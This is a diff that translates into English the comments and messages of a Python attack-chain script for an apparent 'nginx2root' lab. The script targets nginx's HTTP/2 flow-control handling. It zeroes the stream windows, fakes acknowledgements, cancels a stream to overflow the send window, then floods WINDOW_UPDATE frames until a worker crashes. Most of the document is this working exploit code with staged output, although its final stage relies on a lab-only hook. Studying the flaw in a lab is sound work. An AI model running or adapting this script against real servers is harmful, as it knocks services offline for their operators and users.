@@ -1,11 +1,11 @@
-"""Cadeia de ataque do laboratorio nginx2root.
+"""Attack chain for the nginx2root lab.
 
-A sequencia abaixo e' dividida em estagios para a demonstracao. Os
-estagios 1 a 6 sao o comportamento real do nginx 1.31.8 sem qualquer
-alteracao de logica. O estagio 7 usa o gancho de aceleracao compilado
-no alvo do laboratorio, que so' e' alcancavel depois que o invariante
-de controle de fluxo ja' foi quebrado; ele pula para o estado final que
-um ataque real atinge depois de ~52 GiB de trafego WINDOW_UPDATE.
+The sequence below is split into stages for demonstration purposes.
+Stages 1 to 6 are the real behavior of nginx 1.31.8 with no logic
+changes. Stage 7 uses the accelerator hook compiled into the lab
+target; it is only reachable after the flow-control invariant has
+already been broken, and it jumps to the end state a real attack
+reaches after ~52 GiB of WINDOW_UPDATE traffic.
 """
 
 from __future__ import annotations
@@ -17,12 +17,12 @@ import time
 
 from . import h2, ui
 
-# SETTINGS_INITIAL_WINDOW_SIZE (RFC 9113, secao 6.5.2)
+# SETTINGS_INITIAL_WINDOW_SIZE (RFC 9113, section 6.5.2)
 SETTINGS_INITIAL_WINDOW = 0x4
 # Huge response served by the lab target.
 BIG_OBJECT = "/huge.bin"
-STREAM_CREDIT = 8 * 1024 * 1024      # 8 MiB de credito de fluxo por stream
-ACCEL_MAGIC = 0x4E325221             # "N2R!" gancho exclusivo do laboratorio
+STREAM_CREDIT = 8 * 1024 * 1024      # 8 MiB of flow-control credit per stream
+ACCEL_MAGIC = 0x4E325221             # "N2R!" lab-only hook
 
 
 def _read_frames(conn: h2.H2Connection, seconds: float) -> list:
@@ -41,25 +41,25 @@ def _read_frames(conn: h2.H2Connection, seconds: float) -> list:
 
 
 def probe(host: str, port: int) -> None:
-    """Estagio 1 isolado: banner e negociacao ALPN."""
-    ui.stage(1, "RECON", f"alvo {host}:{port}")
+    """Stage 1 on its own: banner and ALPN negotiation."""
+    ui.stage(1, "RECON", f"target {host}:{port}")
 
     try:
         server = h2.http1_server_header(host, port)
     except OSError as exc:
-        ui.bad(f"nao foi possivel conectar: {exc}")
+        ui.bad(f"could not connect: {exc}")
         return
 
     if server:
-        ui.ok(f"banner HTTP/1.1: {ui.yellow(server)}")
+        ui.ok(f"HTTP/1.1 banner: {ui.yellow(server)}")
     else:
-        ui.warn("banner HTTP/1.1 nao retornado")
+        ui.warn("no HTTP/1.1 banner returned")
 
     conn = h2.H2Connection(host, port, timeout=5)
     try:
-        ui.ok(f"ALPN negociado: {ui.green(conn.alpn or '(nenhum)')}")
+        ui.ok(f"ALPN negotiated: {ui.green(conn.alpn or '(none)')}")
         if conn.alpn != "h2":
-            ui.bad("o alvo nao aceitou HTTP/2 neste endpoint")
+            ui.bad("target did not accept HTTP/2 on this endpoint")
             return
         conn.preface({SETTINGS_INITIAL_WINDOW: 0})
         frames = _read_frames(conn, 1.0)
@@ -70,15 +70,15 @@ def probe(host: str, port: int) -> None:
                     for i in range(0, len(payload), 6)
                 ]
                 rendered = ", ".join(f"0x{k:x}={v}" for k, v in values)
-                ui.ok(f"SETTINGS do servidor: {ui.cyan(rendered)}")
+                ui.ok(f"server SETTINGS: {ui.cyan(rendered)}")
                 break
-        ui.note("pre-requisito confirmado: HTTP/2 habilitado no servidor")
+        ui.note("prerequisite confirmed: HTTP/2 enabled on the server")
     finally:
         conn.close()
 
 
 def _probe_recovery(host: str, port: int, timeout: float = 6.0):
-    """Mede em quanto tempo o alvo volta a aceitar conexao TCP."""
+    """Measure how long the target takes to accept TCP connections again."""
     start = time.time()
     while time.time() - start < timeout:
         try:
@@ -90,96 +90,96 @@ def _probe_recovery(host: str, port: int, timeout: float = 6.0):
 
 
 def run(host: str, port: int, accelerate: bool) -> int:
-    ui.stage(1, "RECON", f"alvo {host}:{port}")
+    ui.stage(1, "RECON", f"target {host}:{port}")
     server = h2.http1_server_header(host, port)
     if server:
-        ui.ok(f"banner HTTP/1.1: {ui.yellow(server)}")
+        ui.ok(f"HTTP/1.1 banner: {ui.yellow(server)}")
     else:
-        ui.warn("banner HTTP/1.1 nao retornado")
+        ui.warn("no HTTP/1.1 banner returned")
 
     conn = h2.H2Connection(host, port, rcvbuf=4096, timeout=10)
     if conn.alpn != "h2":
-        ui.bad(f"ALPN inesperado: {conn.alpn!r}; alvo nao fala HTTP/2")
+        ui.bad(f"unexpected ALPN: {conn.alpn!r}; target does not speak HTTP/2")
         conn.close()
         return 2
-    ui.ok(f"ALPN negociado: {ui.green('h2')}")
+    ui.ok(f"ALPN negotiated: {ui.green('h2')}")
 
     try:
         # ------------------------------------------------------------
         ui.stage(2, "SETUP",
-                 "SETTINGS_INITIAL_WINDOW_SIZE=0 e janela de conexao no maximo")
+                 "SETTINGS_INITIAL_WINDOW_SIZE=0 and connection window at maximum")
         conn.preface({SETTINGS_INITIAL_WINDOW: 0})
         conn.window_update(0, h2.MAX_WINDOW - h2.DEFAULT_WINDOW)
-        ui.ok(f"janela da conexao: 65.535 → {ui.cyan(ui.fmt(h2.MAX_WINDOW))} "
+        ui.ok(f"connection window: 65,535 → {ui.cyan(ui.fmt(h2.MAX_WINDOW))} "
               f"(0x7FFFFFFF)")
-        ui.note("janela por stream = 0: o nginx nao pode enviar DATA ainda")
+        ui.note("per-stream window = 0: nginx cannot send DATA yet")
 
         # ------------------------------------------------------------
-        ui.stage(3, "TRIGGER", f"GET {BIG_OBJECT} no stream 1")
+        ui.stage(3, "TRIGGER", f"GET {BIG_OBJECT} on stream 1")
         conn.headers(
             1,
             h2.encode_request(f"{host}:{port}", BIG_OBJECT),
             end_stream=True,
         )
-        ui.ok(f"requisicao enviada; objeto servido tem 64 MiB")
+        ui.ok("request sent; served object is 64 MiB")
         time.sleep(0.3)
 
         conn.window_update(1, STREAM_CREDIT)
-        ui.ok(f"credito de stream concedido: {ui.cyan(ui.human(STREAM_CREDIT))}")
-        ui.note("o nginx enfileira DATA e desconta a janela da conexao")
+        ui.ok(f"stream credit granted: {ui.cyan(ui.human(STREAM_CREDIT))}")
+        ui.note("nginx queues DATA and debits the connection window")
         time.sleep(1.0)
 
         # ------------------------------------------------------------
-        ui.stage(4, "ACK", "cliente confirma os 8 MiB que recebeu")
+        ui.stage(4, "ACK", "client acknowledges the 8 MiB it supposedly received")
         conn.window_update(0, STREAM_CREDIT)
-        ui.ok(f"WINDOW_UPDATE(0, +{ui.fmt(STREAM_CREDIT)}) enviado")
-        ui.note("a janela da conexao volta a crescer, mas parte dos DATA "
-                "ainda esta presa na fila de saida do nginx")
+        ui.ok(f"WINDOW_UPDATE(0, +{ui.fmt(STREAM_CREDIT)}) sent")
+        ui.note("the connection window grows back, but part of the DATA "
+                "is still stuck in nginx's output queue")
         time.sleep(0.3)
 
         # ------------------------------------------------------------
-        ui.stage(5, "CANCEL", "RST_STREAM no stream 1")
+        ui.stage(5, "CANCEL", "RST_STREAM on stream 1")
         conn.rst_stream(1, h2.CANCEL)
-        ui.ok("stream cancelado; o cleanup do nginx devolve o credito dos "
-              "frames que nunca sairam")
-        ui.ok("send_window passa de 0x7FFFFFFF: invariante quebrada")
-        ui.note("este e' o bug (CWE-191): o refund nao e' limitado por "
+        ui.ok("stream cancelled; nginx cleanup refunds the credit of "
+              "frames that never left")
+        ui.ok("send_window exceeds 0x7FFFFFFF: invariant broken")
+        ui.note("this is the bug (CWE-191): the refund is not capped by "
                 "NGX_HTTP_V2_MAX_WINDOW")
         time.sleep(0.4)
 
         # ------------------------------------------------------------
-        ui.stage(6, "AMPLIFY", "WINDOW_UPDATE com a checagem invalida")
+        ui.stage(6, "AMPLIFY", "WINDOW_UPDATE with the broken bounds check")
         conn.window_update(0, 1)
-        ui.ok("WINDOW_UPDATE(0, +1) aceito — deveria ser FLOW_CTRL_ERROR")
+        ui.ok("WINDOW_UPDATE(0, +1) accepted — should be FLOW_CTRL_ERROR")
         time.sleep(0.2)
 
         sent = 1
         for _ in range(3):
             conn.window_update(0, h2.MAX_WINDOW)
             sent += h2.MAX_WINDOW
-            ui.ok(f"WINDOW_UPDATE(0, +0x7FFFFFFF) aceito "
-                  f"(acumulado {ui.yellow('+' + ui.fmt(sent))})")
+            ui.ok(f"WINDOW_UPDATE(0, +0x7FFFFFFF) accepted "
+                  f"(cumulative {ui.yellow('+' + ui.fmt(sent))})")
             time.sleep(0.25)
 
-        ui.note("a checagem `window > MAX_WINDOW - send_window` sofre "
-                "underflow e nunca rejeita")
+        ui.note("the check `window > MAX_WINDOW - send_window` underflows "
+                "and never rejects")
 
         if not accelerate:
-            ui.stage(7, "PARADO", "modo seguro (sem acelerador)")
-            ui.warn("use --accelerate para demonstrar a consequencia final")
-            ui.note("sem o acelerador seriam necessarios ~52 GiB de "
-                    "WINDOW_UPDATE para chegar a 2^63")
+            ui.stage(7, "STOPPED", "safe mode (no accelerator)")
+            ui.warn("use --accelerate to demonstrate the final consequence")
+            ui.note("without the accelerator ~52 GiB of WINDOW_UPDATE "
+                    "would be needed to reach 2^63")
             return 0
 
         # ------------------------------------------------------------
-        ui.stage(7, "CONSEQUENCIA",
-                 "acelerador do laboratorio: salto para o estado final")
+        ui.stage(7, "CONSEQUENCE",
+                 "lab accelerator: jump to the end state")
         conn.window_update(0, ACCEL_MAGIC)
-        ui.ok("contador reposicionado em 2^64 − 1 GiB "
-              "(estado alcancado por um ataque real)")
+        ui.ok("counter repositioned to 2^64 − 1 GiB "
+              "(state reached by a real attack)")
         time.sleep(0.3)
 
-        ui.stage(8, "CRASH", "proxima escrita usa tamanho negativo")
+        ui.stage(8, "CRASH", "next write uses a negative size")
         conn.headers(
             3,
             h2.encode_request(f"{host}:{port}", BIG_OBJECT),
@@ -191,33 +191,33 @@ def run(host: str, port: int, accelerate: bool) -> int:
 
         total, dead = conn.read_until_closed(6.0)
         if dead:
-            ui.ok(f"conexao derrubada apos {ui.human(total)} de DATA")
-            ui.ok("worker do nginx morreu: ngx_memcpy com tamanho "
-                  "size_t gigantesco → SIGSEGV")
-            ui.note("confirme no log do alvo: "
+            ui.ok(f"connection dropped after {ui.human(total)} of DATA")
+            ui.ok("nginx worker died: ngx_memcpy with a huge size_t "
+                  "length → SIGSEGV")
+            ui.note("confirm in the target log: "
                     "\"worker process ... exited on signal 11\" "
-                    "ou exit=139 em `docker compose ps -a`")
+                    "or exit=139 in `docker compose ps -a`")
 
             recovery = _probe_recovery(host, port)
             if recovery is not None:
-                ui.ok(f"o alvo voltou a responder em "
+                ui.ok(f"target responded again after "
                       f"{ui.yellow(f'{recovery * 1000:.0f} ms')}")
-                ui.note("o master do nginx reiniciou o worker: e' por isso "
-                        "que o container continua de pe")
-                ui.note("com N2R_SINGLE=1 (padrao do compose) o crash "
-                        "derruba o container")
+                ui.note("the nginx master respawned the worker: that is why "
+                        "the container is still up")
+                ui.note("with N2R_SINGLE=1 (Compose default) the crash "
+                        "takes the container down")
             else:
-                ui.ok("o alvo NAO voltou a responder: fora do ar "
-                      "(objetivo do ataque)")
+                ui.ok("target did NOT respond again: it is down "
+                      "(attack goal reached)")
 
             print()
-            ui.ok(ui.bold("cadeia completa: invariante quebrada, janela "
-                          "em 2^64, worker morto"))
+            ui.ok(ui.bold("full chain: invariant broken, window at "
+                          "2^64, worker dead"))
             return 0
 
-        ui.warn(f"a conexao sobreviveu ({ui.human(total)} lidos)")
-        ui.note("verifique o log do alvo: o estagio 5 precisa ter "
-                "registrado INVARIANT VIOLATED")
+        ui.warn(f"connection survived ({ui.human(total)} read)")
+        ui.note("check the target log: stage 5 must have "
+                "logged INVARIANT VIOLATED")
         return 1
     finally:
         conn.close()
